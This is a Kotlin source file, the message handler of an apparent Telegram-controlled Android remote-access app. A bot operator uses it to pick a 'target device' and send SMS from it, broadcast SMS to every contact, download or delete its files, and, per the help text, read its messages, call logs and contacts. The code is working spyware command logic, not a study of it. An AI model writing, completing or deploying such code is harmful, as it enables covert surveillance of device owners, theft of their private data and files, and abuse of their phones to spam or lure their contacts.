package com.fasonbot.app.bot

import android.content.Context
import android.util.Log
import com.google.gson.JsonObject
import com.fasonbot.app.action.CommandExecutor
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.service.CoreService

class MessageHandler(
    private val context: Context,
    private val commandExecutor: CommandExecutor
) {

    companion object {
        private const val TAG = "MessageHandler"
        private const val BTN_DEVICES = "📱 Devices"
        private const val BTN_COMMAND = "⚡ Command"
        private const val MAX_PREVIEW_LEN = 50
    }

    private val stateManager = StateManager(context)
    private val keyboardBuilder = KeyboardBuilder()

    fun handle(text: String, messageId: Int, replyTo: JsonObject?) {
        try {
            Log.d(TAG, "Cmd: $text")
            val state = stateManager.getState()
            if (state.isNotEmpty()) {
                handleStateInput(text, state)
                return
            }
            when (text) {
                "/start" -> sendStartMessage()
                "/status" -> sendStatusMessage()
                "/help" -> sendHelpMessage()
                BTN_DEVICES -> sendConnectedDevices()
                BTN_COMMAND -> sendDeviceSelection()
                else -> sendUnknownCommand()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Cmd error: ${e.message}")
        }
    }

    private fun handleStateInput(text: String, state: String) {
        try {
            when (state) {
                "awaiting_sms_number" -> {
                    val sanitized = text.trim().take(20)
                    stateManager.saveStateData("sms_number", sanitized)
                    stateManager.saveState("awaiting_sms_message")
                    TelegramApi.sendMessage(
                        context,
                        "📱 <b>Send SMS</b>\n\n" +
                        "📞 To: ${HtmlUtil.escapeCode(sanitized)}\n\n" +
                        "📝 Enter your message below:\n\n" +
                        "<i>Tip: Long messages will be split automatically.</i>",
                        parseMode = "HTML",
                        replyMarkup = keyboardBuilder.createInlineKeyboard(
                            listOf(listOf("❌ Cancel" to "${Cb.CANCEL}"))
                        )
                    )
                }
                "awaiting_sms_message" -> {
                    val number = stateManager.getStateData("sms_number")
                    val deviceId = stateManager.getStateData("current_device_id")
                    stateManager.clearState()
                    val preview = HtmlUtil.escape(text.take(MAX_PREVIEW_LEN))
                    TelegramApi.sendMessage(
                        context,
                        "📤 <b>Sending SMS</b>\n\n" +
                        "📞 To: ${HtmlUtil.escapeCode(number)}\n" +
                        "💬 $preview${if (text.length > MAX_PREVIEW_LEN) "..." else ""}\n\n" +
                        "<i>Please wait...</i>",
                        parseMode = "HTML"
                    )
                    if (number.isNotEmpty() && deviceId.isNotEmpty()) {
                        if (DeviceManager.isThisDevice(context, deviceId)) {
                            commandExecutor.executeSendSms(number, text)
                        }
                    }
                }
                "awaiting_broadcast" -> {
                    val deviceId = stateManager.getStateData("current_device_id")
                    stateManager.clearState()
                    val preview = HtmlUtil.escape(text.take(MAX_PREVIEW_LEN))
                    TelegramApi.sendMessage(
                        context,
                        "📢 <b>Broadcasting SMS</b>\n\n" +
                        "💬 $preview${if (text.length > MAX_PREVIEW_LEN) "..." else ""}\n\n" +
                        "<i>Sending to all contacts...</i>",
                        parseMode = "HTML"
                    )
                    if (deviceId.isNotEmpty() && DeviceManager.isThisDevice(context, deviceId)) {
                        commandExecutor.executeBroadcastSms(text)
                    }
                }
                "awaiting_file_path" -> {
                    val deviceId = stateManager.getStateData("current_device_id")
                    stateManager.clearState()
                    val safePath = text.trim().take(200)
                    TelegramApi.sendMessage(
                        context,
                        "📥 <b>Downloading File</b>\n\n" +
                        "📁 Path: ${HtmlUtil.escapeCode(safePath)}\n\n" +
                        "<i>Please wait...</i>",
                        parseMode = "HTML"
                    )
                    if (deviceId.isNotEmpty() && DeviceManager.isThisDevice(context, deviceId)) {
                        commandExecutor.executeDownloadFile(safePath)
                    }
                }
                "awaiting_delete_path" -> {
                    val deviceId = stateManager.getStateData("current_device_id")
                    stateManager.clearState()
                    val safePath = text.trim().take(200)
                    TelegramApi.sendMessage(
                        context,
                        "🗑️ <b>Deleting File</b>\n\n" +
                        "📁 Path: ${HtmlUtil.escapeCode(safePath)}\n\n" +
                        "<i>Please wait...</i>",
                        parseMode = "HTML"
                    )
                    if (deviceId.isNotEmpty() && DeviceManager.isThisDevice(context, deviceId)) {
                        commandExecutor.executeDeleteFile(safePath)
                    }
                }
                else -> {
                    stateManager.clearState()
                    sendUnknownCommand()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "State input error: ${e.message}")
            stateManager.clearState()
            TelegramApi.sendMessage(context, "❌ <b>Error</b>\n\n${HtmlUtil.escape(e.message ?: "Unknown error")}", parseMode = "HTML")
        }
    }

    private fun sendStartMessage() {
        TelegramApi.sendMessage(
            context,
            buildString {
                append("👋 <b>Welcome!</b>\n\n")
                append("I'm here to help you manage your connected devices.\n\n")
                append("━━━━━━━━━━━━━━━━━━\n")
                append("📱 <b>Devices</b> - View all connected devices\n")
                append("⚡ <b>Command</b> - Execute commands on devices\n\n")
                append("<i>Type /help for more options</i>")
            },
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createReplyKeyboard(
                listOf(listOf(BTN_DEVICES, BTN_COMMAND))
            )
        )
    }

    private fun sendConnectedDevices() {
        DeviceManager.registerDevice(context)
        val devices = DeviceManager.getRegisteredDevices(context)
        if (devices.isEmpty()) {
            TelegramApi.sendMessage(
                context,
                "📱 <b>No Devices Found</b>\n\n" +
                "No devices are currently connected.\n\n" +
                "<i>Make sure the app is installed and running on the target device.</i>",
                parseMode = "HTML"
            )
            return
        }
        val text = buildString {
            append("📱 <b>Connected Devices</b>\n")
            append("━━━━━━━━━━━━━━━━━━\n\n")
            devices.forEach { device ->
                val status = if (device.isOnline) "🟢" else "🔴"
                append("$status <b>${HtmlUtil.escape(device.deviceName)}</b>\n")
                append("   └ Android ${HtmlUtil.escape(device.androidVersion)}\n\n")
            }
            append("<i>Tap ⚡ Command to control a device</i>")
        }
        TelegramApi.sendMessage(context, text, parseMode = "HTML")
    }

    private fun sendDeviceSelection() {
        DeviceManager.registerDevice(context)
        val devices = DeviceManager.getRegisteredDevices(context)
        if (devices.isEmpty()) {
            TelegramApi.sendMessage(
                context,
                "📱 <b>No Devices Found</b>\n\n" +
                "No devices are currently connected.\n\n" +
                "<i>Make sure the app is installed and running on the target device.</i>",
                parseMode = "HTML"
            )
            return
        }
        TelegramApi.sendMessage(
            context,
            "⚡ <b>Select Device</b>\n\nChoose a device to execute commands:",
            parseMode = "HTML",
            replyMarkup = keyboardBuilder.createInlineKeyboard(
                keyboardBuilder.getDeviceSelectionButtons(context)
            )
        )
    }

    private fun sendStatusMessage() {
        val device = DeviceManager.getThisDeviceInfo(context)
        val battery = BotConfig.getBatteryPercentage(context)
        val serviceStatus = if (CoreService.isRunning()) "🟢 Running" else "🔴 Stopped"
        TelegramApi.sendMessage(
            context,
            buildString {
                append("📊 <b>Device Status</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("📱 <b>${HtmlUtil.escape(device.deviceName)}</b>\n")
                append("🆔 ${HtmlUtil.escapeCode(device.deviceId)}\n\n")
                append("🔋 Battery: <b>$battery%</b>\n")
                append("🤖 Android: <b>${HtmlUtil.escape(device.androidVersion)}</b>\n")
                append("📶 Network: <b>${HtmlUtil.escape(BotConfig.getProviderName(context))}</b>\n")
                append("⚙️ Service: <b>$serviceStatus</b>")
            },
            parseMode = "HTML"
        )
    }

    private fun sendHelpMessage() {
        TelegramApi.sendMessage(
            context,
            buildString {
                append("📚 <b>Help Center</b>\n")
                append("━━━━━━━━━━━━━━━━━━\n\n")
                append("<b>📱 Device Management</b>\n")
                append("• View connected devices\n")
                append("• Check device status\n\n")
                append("<b>📞 Call Log</b>\n")
                append("• View recent calls\n\n")
                append("<b>👥 Contacts</b>\n")
                append("• Get all saved contacts\n\n")
                append("<b>💬 SMS</b>\n")
                append("• Read messages\n")
                append("• Send to specific number\n")
                append("• Broadcast to all contacts\n\n")
                append("<b>📁 File Manager</b>\n")
                append("• Browse device files\n")
                append("• Download files\n")
                append("• Delete files\n\n")
                append("<b>⚡ Commands</b>\n")
                append("/start - Main menu\n")
                append("/status - Device status\n")
                append("/help - This message")
            },
            parseMode = "HTML"
        )
    }

    private fun sendUnknownCommand() {
        TelegramApi.sendMessage(
            context,
            "🤔 <b>Unknown Command</b>\n\n" +
            "I didn't understand that.\n\n" +
            "<i>Type /start to begin</i>",
            parseMode = "HTML"
        )
    }
}
